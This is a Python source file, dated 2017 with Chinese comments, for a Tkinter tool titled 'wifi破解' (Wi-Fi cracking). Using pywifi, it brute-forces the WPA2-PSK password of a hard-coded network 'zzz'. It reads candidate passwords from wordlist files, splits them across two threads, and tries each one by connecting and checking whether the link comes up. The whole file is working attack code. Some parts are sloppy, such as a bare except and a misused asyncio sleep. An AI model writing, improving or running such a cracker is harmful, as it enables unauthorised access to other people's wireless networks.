# coding:utf-8
'''
 日 期： 2017年7月27日
#--接收mainCeShi传来的列表,创建窗口，进行破解(wifi)
@作者: 张天赠
'''
import sys  #系统
import time  #时间
import platform  #平台
import logging  #日志
from tkinter import *
import tkinter.messagebox
import pywifi  #破解wifi
from pywifi import const  #引用一些定义
import threading
from asyncio.tasks import sleep
# import wifiTools.MainUi
class PoJie():
    def __init__(self,list1):
        
        self.STR=1
        self.NUMBER =2
        self.root =Tk()
        self.root.geometry("300x300")
        self.root.title("wifi破解")
        
        self.objevg =[]
        for i in range(self.NUMBER):
            self.objevg.append([])
            
        self.listevg=[]
        self.list1 =list1
        self.Lbox =Listbox(self.root,width="40")
        self.Lbox.grid(row =1,column=0)
        self.Lbox.insert(END,"查询中......")
        self.btn =Button(self.root,text="开始破解",command=self.XianCheng)
        self.btn.grid(row =0,column =0)
        wifi = pywifi.PyWiFi() #抓取网卡接口
    
        self.iface = wifi.interfaces()[0]#抓取第一个无限网卡
    
        self.iface.disconnect() #测试链接断开所有链接
    
        time.sleep(1) #休眠1秒
    
        #测试网卡是否属于断开状态，
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        self.root.mainloop()
        
        pass
    def XianCheng(self):
        
        self.btn["text"]="破解中"
        self.PassWord()
        
        for i in range(self.NUMBER):
            th=threading.Thread(target=self.readPassWord,args=(i,))  
             
            th.start()
        
       
        
       
      
        pass
    def evgSplit2(self,sum2,N):
        listnum=[]
        sum1= sum2
        count =N
        f =sum1 //count
        a = sum1 %count
        if a==0:
            for i in range(count):
                listnum.append(f)
        else:
            for i in range(count):
                listnum.append(f)
            for k in range(0,a):
                listnum[k] =listnum[k]+1 
        
        return listnum
    
    def PassWord(self):
        listnum=self.evgSplit2(len(self.list1),self.NUMBER)
        self.myobject =[]
        count =0
        flag =0
        for line in self.list1:
            file1 =open(line,"r",errors="ignore")
            self.myobject.append(file1)
        
        while len(self.myobject) !=0:
            num=listnum[count]
            
            
            for i in range(num):
                self.objevg[count].append(self.myobject[flag])
                flag+=1
            count +=1
            if count ==self.NUMBER:
                break
            
        
#         self.evgSplit2(len(self.list1),4)
#         flag=0
#         for line in self.list1:
#             file1 =open(line,"r",errors="ignore")
# #             self.myobject.append(file1)
#             self.objevg[flag].append(file1)
#             if len(self.objevg[flag]) == self.listevg[flag]:
#                 flag +=1
        
        pass
    def readPassWord(self,i):
        flag =int(i)
#         self.PassWord()
        
        for file00 in self.objevg[flag]:
            
            while True:
               
                try:
                    myStr =file00.readline()
                    if not myStr:
                        break
                    name,bool1=self.test_connect(myStr)
                    if bool1:
                        
                        self.Lbox.insert(END,name+str(i)+"-密码正确:"+myStr)
                        print(myStr)
                       # ret =tkinter.messagebox.showinfo(title ="破解成功",message=name+str(i)+"-密码:"+myStr)
                        self.root.update()
    
                        self.btn["text"]="开始破解"
                        break
                    else:
                        
                        self.Lbox.insert(END,name+str(i)+"-密码错误:"+myStr)
                        self.root.update()
                        print((END,name+str(i)+"-密码错误:"+myStr))
                    sleep(3)
                except:
                    continue
                    
            
        self.btn["text"]="-开始破解"
    def test_connect(self,findStr):#测试链接
    
     
    
    
    
        profile = pywifi.Profile()  #创建wifi链接文件
        profile.ssid = 'zzz' #wifi名称
        profile.auth = const.AUTH_ALG_OPEN  #网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
        profile.key = findStr #密码
    
        self.iface.remove_all_network_profiles() #删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)#设定新的链接文件
    
        self.iface.connect(tmp_profile)#链接
        time.sleep(10)
        
        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
            
            isOK=True
            tkinter.messagebox.showinfo(title ="破解成功",message="-密码:"+findStr)
            
            
        else:
            
            isOK=False
        self.iface.disconnect() #断开
        time.sleep(1)
        #检查断开状态
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
    
        return profile.ssid,isOK
    
    
    def test_disconnect(self):
        wifi = pywifi.PyWiFi()  #抓取网卡接口
        iface = wifi.interfaces()[0]  #抓取第一个无限网卡
        iface.disconnect() #断开连接
        assert iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def __del__(self):
        for line in self.myobject:
            line.close()
        pass
